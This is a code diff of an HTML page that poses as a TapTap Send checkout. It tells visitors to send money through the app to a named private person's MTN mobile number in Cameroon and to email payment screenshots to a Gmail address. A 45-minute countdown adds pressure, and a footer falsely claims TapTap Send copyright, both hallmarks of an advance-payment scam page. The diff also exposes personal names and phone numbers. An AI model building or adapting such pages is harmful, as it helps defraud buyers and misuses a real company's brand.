@@ -2,342 +2,309 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-
-<!-- MOBILE RESPONSIVE FIX -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Taptap Send Payment</title>
+<title>Payment Page</title>
 
 <style>
-
-*{
-    box-sizing:border-box;
-}
-
-body{
-    font-family:Arial, sans-serif;
-    background:#f5f5f5;
-    margin:0;
-    padding:15px;
-}
-
-/* MAIN CARD */
-.box{
-    background:white;
-    width:100%;
-    max-width:520px;
-    margin:auto;
-    padding:28px;
-    border-radius:14px;
-    box-shadow:0 4px 15px rgba(0,0,0,0.08);
-}
-
-/* HEADINGS */
-h2{
-    text-align:center;
-    margin-top:0;
-    margin-bottom:10px;
-    font-size:28px;
-}
-
-.subtitle{
-    text-align:center;
-    color:#555;
-    margin-bottom:25px;
-    line-height:1.6;
-}
-
-/* ORDER */
-.order{
-    margin-bottom:25px;
-    font-size:17px;
-}
-
-/* BUTTON */
-button{
-    background:#28a745;
-    color:white;
-    border:none;
-    width:100%;
-    padding:15px;
-    font-size:17px;
-    border-radius:8px;
-    cursor:pointer;
-    margin-bottom:25px;
-    transition:0.3s;
-}
-
-button:hover{
-    opacity:0.92;
-}
-
-/* SECTIONS */
-#timerBox,
-#emailBox,
-#statusBox,
-.instructions{
-    margin-top:30px;
-    padding-top:20px;
-    border-top:1px solid #eee;
-}
-
-/* TIMER */
-#timer{
-    color:blue;
-    font-size:34px;
-    font-weight:bold;
-    margin-top:10px;
-}
-
-/* INSTRUCTIONS */
-.instructions p{
-    line-height:1.8;
-    margin-bottom:16px;
-}
-
-.instructions ul{
-    padding-left:22px;
-    line-height:1.8;
-}
-
-/* EMAIL LINK */
-a.payment-link{
-    color:blue;
-    font-weight:bold;
-    text-decoration:underline;
-}
-
-/* MOBILE OPTIMIZATION */
-@media(max-width:600px){
-
-    body{
-        padding:10px;
+    body {
+        font-family: Arial;
+        background: #f5f5f5;
+        margin: 0;
+        padding: 20px;
+        display: flex;
+        flex-direction: column; 
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        box-sizing: border-box;
+        color: #333;
     }
 
-    .box{
-        padding:22px;
+    .box {
+        background: white;
+        width: 100%;
+        max-width: 500px;
+        padding: 25px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        box-sizing: border-box;
     }
 
-    h2{
-        font-size:24px;
+    .header-section {
+        text-align: center;
+        margin-bottom: 25px;
     }
 
-    button{
-        font-size:16px;
+    h2 {
+        margin: 0;
+        font-size: 20px;
+        font-weight: 700;
     }
 
-}
+    .sub-text {
+        color: #777;
+        font-size: 14px;
+        margin-top: 5px;
+    }
 
+    /* TRANSPARENT BOX FOR ORDER ID */
+    .order-id {
+        margin: 20px auto 10px auto;
+        font-size: 15px;
+        display: inline-block;
+        padding: 8px 16px;
+        background: rgba(0, 0, 0, 0.03); /* Soft semi-transparent tint */
+        border: 1px solid rgba(0, 0, 0, 0.08); /* Delicate transparent border */
+        border-radius: 6px;
+    }
+
+    /* PRE-PAYMENT WARNING */
+    .pre-pay-warning {
+        background: #fff9e6;
+        border: 1px solid #ffeeba;
+        color: #856404;
+        padding: 12px;
+        border-radius: 8px;
+        font-size: 13px;
+        margin-bottom: 15px;
+        line-height: 1.4;
+        display: flex;
+        gap: 8px;
+    }
+
+    #payBtn {
+        width: 100%;
+        padding: 16px;
+        background: #1a9d3a;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+
+    #appBtn {
+        display: none;
+        text-align: center;
+        background: #000;
+        color: white;
+        padding: 16px;
+        border-radius: 8px;
+        text-decoration: none;
+        font-weight: bold;
+        margin-bottom: 10px;
+    }
+
+    .section {
+        margin-top: 20px;
+        padding-top: 20px;
+        border-top: 1px solid #f0f0f0;
+    }
+
+    .section-title {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-weight: bold;
+        font-size: 15px;
+        margin-bottom: 8px;
+    }
+
+    #timer {
+        font-size: 28px;
+        color: #0047ff;
+        font-weight: bold;
+        margin-left: 35px;
+        display: none; 
+    }
+
+    #timerPlaceholder {
+        font-size: 14px;
+        color: #666;
+        margin-left: 35px;
+        font-style: italic;
+    }
+
+    .instructions {
+        display: block; 
+        margin-top: 20px;
+        background: #f1f9f1;
+        border-radius: 12px;
+        padding: 20px;
+    }
+
+    .instr-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-weight: bold;
+        margin-bottom: 15px;
+        color: #1a9d3a;
+    }
+
+    .step-list {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+        font-size: 14px;
+    }
+
+    .step-list li { margin-bottom: 8px; }
+
+    .sub-list {
+        list-style: disc;
+        margin-left: 45px;
+        margin-top: 5px;
+    }
+
+    .recipient-details {
+        margin-top: 20px;
+        padding-top: 15px;
+        border-top: 1px solid #ddeadd;
+        font-size: 14px;
+    }
+
+    .status-text {
+        color: #f39c12;
+        font-weight: bold;
+        margin-left: 35px;
+    }
+
+    .proof-text {
+        font-size: 13px;
+        color: #666;
+        margin: 0 0 10px 35px;
+    }
+
+    .proof-link {
+        color: #0047ff;
+        text-decoration: none;
+        font-weight: bold;
+        margin-left: 35px;
+    }
+
+    /* COPYRIGHT FOOTER */
+    .copyright-footer {
+        margin-top: 25px;
+        font-size: 12px;
+        color: #888;
+        text-align: center;
+    }
 </style>
 </head>
 
 <body>
 
 <div class="box">
+    <div class="header-section">
+        <h2>Complete Payment with TapTap Send</h2>
+        <div class="sub-text">Via Debit Card, Bank and Apple Pay</div>
+        <!-- ORDER ID WRAPPED IN CONTAINER -->
+        <div>
+            <div class="order-id"><b>Order ID:</b> ORD-Q742816</div>
+        </div>
+    </div>
 
-<h2>Complete Payment with TapTap Send</h2>
+    <!-- PRE-PAYMENT IDENTITY NOTE -->
+    <div class="pre-pay-warning" id="prePayNote">
+        <span>⚠️</span>
+        <span>You may be asked to verify your identity/residence so please endeavor to do so.</span>
+    </div>
 
-<p class="subtitle">
-Via Debit Card, Bank and Apple Pay
-</p>
+    <button id="payBtn" onclick="startPayment()">Pay Now</button>
+    
+    <a id="appBtn" href="https://apps.apple.com/cm/app/taptap-send-money-transfer/id1413346006?l=en-GB">
+        📱 Open TapTap Send
+    </a>
 
-<div class="order">
-<strong>Order ID:</strong>
-<span id="orderID"></span>
+    <!-- TIMER SECTION -->
+    <div class="section">
+        <div class="section-title">🕒 Payment Time</div>
+        <div id="timerPlaceholder">Payment should be completed within 45 minutes.</div>
+        <div id="timer">45:00</div>
+    </div>
+
+    <!-- INSTRUCTIONS SECTION -->
+    <div class="instructions" id="instructionsBox">
+        <div class="instr-header">
+            <span>☰</span> Payment Instructions
+        </div>
+        
+        <ul class="step-list">
+            <li><b>Step 1:</b> Open the TapTap Send app</li>
+            <li><b>Step 2:</b> Search - Cameroon</li>
+            <li><b>Step 3:</b> Enter the amount and tap <i>Next</i></li>
+            <li><b>Step 4:</b> Add recipient</li>
+            <li><b>Step 5:</b> Use MTN</li>
+            <li><b>Step 6:</b> Choose payment option:
+                <ul class="sub-list">
+                    <li>Debit Card</li>
+                    <li>Bank</li>
+                    <li>Apple Pay</li>
+                </ul>
+            </li>
+        </ul>
+
+        <div class="recipient-details">
+            <b>Recipient Details:</b><br>
+            Number: 683459159<br>
+            Name: JEANNETTE NGO<br>
+            Network: MTN Cameroon
+        </div>
+    </div>
+
+    <!-- PROOF SECTION -->
+    <div class="section">
+        <div class="section-title">✉️ Send Proof of Payment</div>
+        <p class="proof-text">After completing payment, please send your screenshot via email.</p>
+        <a href="mailto:paymentchecks72@gmail.com?subject=Payment Proof - ORD-Q742816" class="proof-link">Send Payment Proof</a>
+    </div>
+
+    <!-- STATUS SECTION -->
+    <div class="section">
+        <div class="section-title">ⓘ Payment Status:</div>
+        <div class="status-text" id="statusText">Waiting confirmation...</div>
+    </div>
 </div>
 
-<button onclick="startPayment()">
-Pay Now
-</button>
-
-<!-- TIMER -->
-<div id="timerBox" style="display:none;">
-<p><strong>Payment Time Remaining</strong></p>
-<h3 id="timer">45:00</h3>
-</div>
-
-<!-- EMAIL -->
-<div id="emailBox" style="display:none;">
-
-<h3>Send Proof of Payment</h3>
-
-<p>
-After completing payment, please send your screenshot or payment confirmation via email.
-</p>
-
-<p>
-<a id="emailLink"
-href="#"
-target="_blank"
-class="payment-link">
-Send Payment Proof
-</a>
-</p>
-
-<p style="font-size:14px;color:gray;">
-Once verified, your order will be confirmed.
-</p>
-
-</div>
-
-<!-- INSTRUCTIONS -->
-<div class="instructions">
-
-<p><strong>Step 1:</strong> Open the TapTap Send app</p>
-
-<p><strong>Step 2:</strong> Search - Cameroon</p>
-
-<p><strong>Step 3:</strong> Enter the amount and tap <b>Next</b></p>
-
-<p><strong>Step 4:</strong> Add recipient</p>
-<p><strong>Step 5:</strong> Use MTN</p>
-
-<p><strong>Step 6:</strong> Choose payment option:</p>
-
-<ul>
-<li>Debit Card</li>
-<li>Bank</li>
-<li>Apple Pay</li>
-</ul>
-
-<p><strong>Recipient Details:</strong></p>
-
-<p>
-<b>Number:</b> 652853210<br>
-<b>Name:</b> CHANCELINE SANDRINE
-</p>
-
-
-<p>
-You may also be asked for your postcode or identity verification.
-</p>
-
-</div>
-
-<!-- STATUS -->
-<div id="statusBox" style="display:none;">
-
-<p>
-<strong>Payment Status:</strong>
-
-<span id="paymentStatus"
-style="color:orange;font-weight:bold;">
-Waiting confirmation...
-</span>
-</p>
-
-</div>
-
+<!-- COPYRIGHT TRADEMARK BELOW FOOTER -->
+<div class="copyright-footer">
+    &copy; 2026 TapTap Send. All rights reserved. &trade;
 </div>
 
 <script>
-
-// GET ORDER ID
-let params = new URLSearchParams(window.location.search);
-
-let orderID = params.get("order");
-
-if(!orderID){
-
-    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-
-    const randomLetter =
-        letters.charAt(
-            Math.floor(Math.random()*letters.length)
-        );
-
-    const number =
-        Math.floor(100000 + Math.random()*900000);
-
-    orderID = "ORD-" + randomLetter + number;
+function startPayment() {
+    window.open("https://apps.apple.com/cm/app/taptap-send-money-transfer/id1413346006?l=en-GB","_blank");
+    
+    document.getElementById("payBtn").style.display = "none";
+    document.getElementById("prePayNote").style.display = "none"; 
+    document.getElementById("appBtn").style.display = "block";
+    document.getElementById("instructionsBox").style.display = "block";
+    
+    document.getElementById("timerPlaceholder").style.display = "none";
+    document.getElementById("timer").style.display = "block";
+    
+    startTimer(2700); 
 }
 
-document.getElementById("orderID").innerText =
-    orderID;
-
-// START PAYMENT
-function startPayment(){
-
-    // OPEN APP STORE
-    window.open(
-      "https://apps.apple.com/cm/app/taptap-send-money-transfer/id1413346006?l=en-GB",
-      "_blank"
-    );
-
-    // SHOW UI
-    document.getElementById("timerBox").style.display="block";
-
-    document.getElementById("emailBox").style.display="block";
-
-    document.getElementById("statusBox").style.display="block";
-
-    // EMAIL
-    const email =
-        "Paymentreceipts383@gmail.com";
-
-    const subject =
-        encodeURIComponent(
-            "Order Proof of Payment"
-        );
-
-    const body =
-        encodeURIComponent(
-`Hello,
-
-I have completed the payment for Order ID: ${orderID}
-
-Please verify.
-
-Thank you.`
-        );
-
-    document.getElementById("emailLink").href =
-      `mailto:${email}?subject=${subject}&body=${body}`;
-
-    startTimer();
-}
-
-// TIMER
-function startTimer(){
-
-    let time = 2700;
-
-    let countdown = setInterval(function(){
-
-        let minutes =
-            Math.floor(time/60);
-
-        let seconds =
-            time % 60;
-
-        seconds =
-            seconds < 10
-            ? "0"+seconds
-            : seconds;
-
-        document.getElementById("timer").innerHTML =
-            minutes + ":" + seconds;
-
-        time--;
-
-        if(time < 0){
-
+function startTimer(duration) {
+    let timer = duration, minutes, seconds;
+    let display = document.querySelector('#timer');
+    let countdown = setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        display.textContent = minutes + ":" + seconds;
+        if (--timer < 0) {
             clearInterval(countdown);
-
-            document.getElementById("timer").innerHTML =
-                "Payment Window Expired";
-
-            document.getElementById("paymentStatus").innerText =
-                "Payment Expired";
-
-            document.getElementById("paymentStatus").style.color =
-                "red";
+            display.textContent = "Expired";
+            document.getElementById("statusText").innerText = "Expired";
+            document.getElementById("statusText").style.color = "red";
         }
-
-    },1000);
-
+    }, 1000);
 }
-
 </script>
 
 </body>
